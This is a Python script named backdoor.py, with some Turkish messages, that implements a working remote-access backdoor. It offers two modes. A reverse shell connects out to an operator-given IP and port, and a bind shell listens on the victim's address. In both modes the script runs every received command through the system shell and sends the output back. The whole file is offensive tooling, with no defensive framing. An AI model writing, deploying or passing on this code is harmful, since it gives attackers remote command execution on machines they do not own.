#!/usr/bin/python3
import socket
import sys
import subprocess
import os
import re
print("""
██████╗ ██████╗ ██╗   ██╗     ██╗   ██╗███████╗████████╗
██╔══██╗██╔══██╗██║   ██║     ╚██╗ ██╔╝╚══███╔╝╚══██╔══╝
██║  ██║██████╔╝██║   ██║█████╗╚████╔╝   ███╔╝    ██║   
██║  ██║██╔═══╝ ██║   ██║╚════╝ ╚██╔╝   ███╔╝     ██║   
██████╔╝██║     ╚██████╔╝        ██║   ███████╗   ██║   
╚═════╝ ╚═╝      ╚═════╝         ╚═╝   ╚══════╝   ╚═╝   
Usage ./backdoor.py --l <PORT>
Usage ./backdoor.py --v <Ip> <PORT>
                                                        """)


def rvrscnnct(ip,port):
    try:
        output = subprocess.Popen(['hostname -I'], shell=True, stdout=subprocess.PIPE)
        a=output.stdout.read()
        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",str(a))[0]
        rvrscnct=socket.socket()
        rvrscnct.connect((ip,int(port)))
        rvrscnct.settimeout(2)
        host=str.encode('[*] SESSION CREATED '+ip_candidates)
        rvrscnct.send(host)
        while True:
            try:
                command=rvrscnct.recv(5120).decode('utf-8')
                if "exit" in command:
                    rvrscnct.close()
                    sys.exit(1)
                
                if ("cd" in command[:2]):
                    os.chdir(command[3:])
                    aq=os.getcwd()
                    rvrscnct.send(aq.encode('utf-8'))
                else:
                    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)                
                    rvrscnct.sendall(bytes(output.stdout.read()))
                    rvrscnct.sendall(bytes(output.stderr.read()))

            except socket.timeout:
                pass
            except IOError as a :
                ioerror=str.encode("Dizin Bulunamadi")
                rvrscnct.send(ioerror)
                pass
            
                
                
    except ConnectionRefusedError:
        print("Baglanti hatasi")
    except Exception as f:
        print(f)
    except KeyboardInterrupt:
        print("Baglanti zorla kapatildi")
        rvrscnct.close()
        sys.exit(1)
def bndcnnct(port):
    try:
        output = subprocess.Popen(['hostname -I'], shell=True, stdout=subprocess.PIPE)
        a=output.stdout.read()
        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",str(a))[0]
        bindshell=socket.socket()
        bindshell.bind((ip_candidates,int(port)))
        bindshell.listen(2)
        a,b=bindshell.accept()
        host=str.encode('[*] SESSION CREATED '+ip_candidates)
        a.send(host)
        a.settimeout(2)
        while True:
            try:
                command=a.recv(5120).decode('utf-8')
                if "exit" in command:
                    a.close()
                    sys.exit(1)
                
                if ("cd" in command[:2]):
                    os.chdir(command[3:])
                    aq=os.getcwd()
                    a.send(aq.encode('utf-8'))
                else:
                    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)                
                    a.sendall(bytes(output.stdout.read()))
                    a.sendall(bytes(output.stderr.read()))

            except socket.timeout:
                pass
            except IOError as a :
                ioerror=str.encode("[-] Directory Not Found")
                a.send(ioerror)
                pass
            
    except Exception as f:
        print(f)
    
    

if __name__=='__main__':
    if len(sys.argv) < 3:
        print("[-] Missing Parameter")
        print('Usage ./backdoor.py --l <PORT>')
        print('Usage ./backdoor.py --v <Ip> <PORT>')
    elif ("--l" in sys.argv[1]):
        bndcnnct(sys.argv[2])
    elif("--c" in sys.argv[1]):
        rvrscnnct(sys.argv[2],sys.argv[3])
